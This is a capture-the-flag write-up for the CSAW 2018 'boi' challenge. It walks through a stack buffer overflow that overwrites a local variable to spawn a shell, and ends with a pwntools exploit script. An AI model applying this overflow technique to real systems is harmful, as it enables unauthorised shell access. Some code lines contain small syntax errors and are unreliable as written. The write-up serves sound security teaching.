**This is a writeup for CSAW2018 boi challenge**

Lets take a look at the main function
```
undefined8 main(void)

{
  long in_FS_OFFSET;
  undefined8 input;
  undefined8 local_30;
  undefined4 uStack40;
  int target;
  long stackCanary;
 
  stackCanary = *(long *)(in_FS_OFFSET + 0x28);
  input = 0;
  local_30 = 0;
  uStack40 = 0;
  target = -0x21524111;
  puts("Are you a big boiiiii??");
  read(0,&input,0x18);
  if (target == -0x350c4512) {
    run_cmd("/bin/bash");
  }
  else {
    run_cmd("/bin/date");
  }
  if (stackCanary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

We can see that our target value is being initialized to "0xDEADBEEF"
```
target = -0x21524111;
```

Next, our function is taking user input at the line
```
puts("Are you a big boiiiiii??");
read(0,&userinput,0x18);
```

The read function is reading from standard input, storing the value into our userInput variable, and is reading a total of 24 bytes since 1 x 16 + 8 = 24

After we read the user input, we then compare our target variable with the value 0xCAF3BAEE. If this comparison returns true then we are given a shell on the machine. If it return false then we are given the time.

Now lets take a look to see where our variables lie on the stack. This will help us figure out how we can overwrite the variable "target" so that it contains the value "CAF3BAEE" instead pf "0xDEADBEEF"

Our stack:
```
Stack[-0x10]:8 local_10
Stack[-0x20]:4 local_20
Stack[-0x24]:4 target
Stack[-0x30]:8 local_30
Stack[-0x38]:8 userInput
```

From the stack we can see that our user input is being read in the address space of -0x38 which is 56 bytes from the base pointer on the stack.

We can also see that the target variable is located at -0x24 which is 36 bytes from the base pointer.

We can calculate the offset by subracting the values 56 - 36 which gives us an offset of 20 bytes.

Now remember that the read function was reading in 24 bytes of data from stdin.
This means that we can read in 20 bytes of junk characters and with the last 4 bytes, put an integer value of "CAF3BAEE" into the target variable (Chars are 1 bytes and ints are 4 bytes).

If we start constructing our payload, it will look something like this
```
payload = b"A" * 20 + p32(CAF3BAEE)"
```

Like I mentioned before, this will read in 20 bytes of characters to land us into the stack space of the target variable. We can now overwrite the value in that variable to our target value of CAF3BAEE in order to pass the comparison statement.

**FINAL EXPLOIT**
```
from pwn import *

BINARY="./boi"
elf=ELF(BINARY)
context.binary(elf)

OFFSET=20

payload=b"A" * OFFSET + p32(0xCAF3BAEE)

def exploit_local():
    r=process(BINARY)
    r.sendline(payload)
    r.interactive()

if __name__ == "__main__":
    exploit_local()
```